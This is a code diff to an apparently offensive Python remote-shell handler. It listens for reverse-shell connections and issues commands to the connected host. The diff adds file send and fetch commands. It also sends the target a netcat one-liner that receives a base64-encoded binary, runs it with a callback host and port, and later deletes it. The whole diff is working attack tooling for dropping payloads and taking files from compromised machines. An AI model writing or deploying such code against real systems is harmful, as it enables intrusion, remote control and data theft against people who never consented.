@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
-from modules.utils import pretty, listen, send_file, chk_payload
+from modules.utils import listen, send_file, chk_payload
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import netshell_loop
+from modules.nethelper import netshell_loop, pretty
 from threading import Thread
 import logging
 import socket
@@ -13,6 +13,8 @@ import os
 
 
 logging.basicConfig(level=logging.INFO)
+sys.dont_write_bytecode = True
+PROJ_DIR = os.path.dirname(os.path.realpath(__file__))
 
 class NetShell(cmd.Cmd):
     def __init__(self, server):
@@ -45,9 +47,6 @@ class NetShell(cmd.Cmd):
     """
 
     def _is_alive(self):
-        """ Checks if socket is alive
-            https://stackoverflow.com/questions/48024720/python-how-to-check-if-socket-is-still-connected
-        """
         while self.is_loop:
             try:
                 data = self.server.client_socket.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
@@ -89,6 +88,19 @@ class NetShell(cmd.Cmd):
                 path = pretty(self.server.send_command(f"realpath {line}"))
 
         sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
+    
+    def do_send(self, line):
+        check = self.server.send_command(f"sendingfile/{line}")
+        if b"ready" in check:
+            with open(line, 'rb') as f:
+                while (chunk := f.read(1024)):
+                    self.server.client_socket.send(chunk)
+
+    def do_get(self, line):
+        text = pretty(self.server.send_command(f"gettingfile/{line}"))
+        if text:
+            with open(line.split("/")[-1], 'w') as f:
+                f.write(text)
 
     def do_run(self, line):
         self.output = self.server.send_command(line, wt_output=False)
@@ -112,9 +124,9 @@ class LocalShell(cmd.Cmd):
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
         
-        if not os.path.isfile('payload'):
+        if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
             logging.warning('Warning: Binary file "payload" is not present.')
-            chk_payload()
+            chk_payload(PROJ_DIR)
 
         
     def emptyline(self):
@@ -136,26 +148,33 @@ class LocalShell(cmd.Cmd):
     """
 
     def do_listen(self, line):
-        sock = listen(line, 0)
+        if not line:
+            host, port = ("localhost", 4242)
+        else:
+            host, port = line.strip().split(" ")
+
+        sock = listen(host, port, 0)
         sock.sysinfo = SystemInfoGatherer()
         sock.sysinfo.binaryGatherer(sock)
 
         if not sock:
             return
         
-        if sock.sysinfo.is_python3:
+        if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
             sock.client_socket.send(b"touch payload\n")
             sock.client_socket.send(b"chmod +x payload\n")
-            sock.client_socket.send(b"setsid sh -c 'nc -l 1234 | base64 -d > payload && sleep 5 && ./payload'\n")
+            sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -l 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
             sock.server_socket.close()
             sock.client_socket.close()
-            send_file("payload", "localhost", 1234)
+            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
-            sock = listen(line, 1)
-            sock.client_socket.send(b"rm -rf payload\n")
+            sock = listen(host, port, 1)
+            if not sock:
+                return
+            sock.client_socket.send(b"rm -rf payload")
         else:
-            logging.error("python was not found. Using shell as client.")
+            logging.error("Fail to sent payload. Using shell as client.")
 
         self.currentSession = NetShell(sock)
 
